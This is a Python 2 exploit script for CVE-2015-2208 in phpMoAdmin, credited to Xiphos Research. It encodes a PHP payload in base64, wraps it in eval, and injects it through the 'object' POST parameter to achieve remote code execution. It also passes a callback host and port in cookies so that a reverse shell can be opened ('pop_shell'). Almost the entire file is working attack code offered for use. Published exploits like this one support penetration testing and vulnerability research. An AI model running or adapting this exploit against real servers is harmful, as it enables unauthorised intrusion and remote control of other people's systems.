#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150305.1
# Licence: WTFPL - wtfpl.net
import requests
import sys
__version__ = "20150305.3"

def banner():
    print """\x1b[1;33m
███╗   ██╗███████╗███████╗██████╗ ███████╗    ███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔════╝██╔════╝██╔══██╗██╔════╝    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║█████╗  █████╗  ██║  ██║███████╗    ██╔████╔██║██║   ██║██████╔╝█████╗  
██║╚██╗██║██╔══╝  ██╔══╝  ██║  ██║╚════██║    ██║╚██╔╝██║██║   ██║██╔══██╗██╔══╝  
██║ ╚████║███████╗███████╗██████╔╝███████║    ██║ ╚═╝ ██║╚██████╔╝██║  ██║███████╗
╚═╝  ╚═══╝╚══════╝╚══════╝╚═════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                                                  
                     █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗                      
                    ██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║                      
                    ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║                      
                    ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║                      
                    ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║                      
                    ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝    
    Exploit for phpMoAdmin, CVE-2015-2208   Version: %\x1b[0m"""

def php_encoder(php):
    f = open(php, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    code = "eval(base64_decode('%s'));" %(encoded)
    return code


def pop_shell(target, code, cb_host, cb_port):
    print "{+} Sending Payload..."
    cookies = {'host': cb_host, 'port': cb_port}
    post_data = {"object": "1;%s;exit" %(code)}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
    try:
        r = requests.post(url=target, data=post_data, headers=headers, verify=False, cookies=cookies)
    except Exception, e:
        sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
    if r.text:
        print r.text.strip()
		

def main(args):
    banner()
    if len(args) != 5:
        sys.exit("use: %s http://host/phpMoAdmin/moadmin.php <payload.php> <cb_host> <cb_port>" %(args[0]))
    pop_shell(target=args[1], code=php_encoder(args[2]), cb_host=args[3], cb_port=args[4])

if __name__ == "__main__":
    main(args=sys.argv)
